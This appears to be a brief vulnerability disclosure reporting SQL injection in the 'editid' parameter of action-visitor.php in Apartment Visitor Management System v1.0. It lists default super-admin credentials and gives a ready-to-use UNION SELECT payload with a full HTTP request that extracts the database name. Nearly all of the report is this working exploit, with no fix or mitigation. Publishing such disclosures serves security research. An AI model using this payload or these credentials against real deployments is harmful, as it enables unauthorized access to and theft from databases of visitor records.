# Apartment Visitor Management System v1.0 by oretnom23 has SQL injection

BUG_Author: xxxcoll

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

The program is built using the xmapp-php8.1 version

Vulnerability File: /avms/action-visitor.php?editid=

Vulnerability location: /avms/action-visitor.php?editid=, editid

dbname =avms_db

[+] Payload: /avms/action-visitor.php?editid=-17%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12--+ // Leak place ---> editid

```sql
GET /avms/action-visitor.php?editid=-17%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=fjhrjdpuej6edqv5haoadpj3lc
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/183243119-fd833f5c-e773-4e09-8a36-07ba5025f215.png)
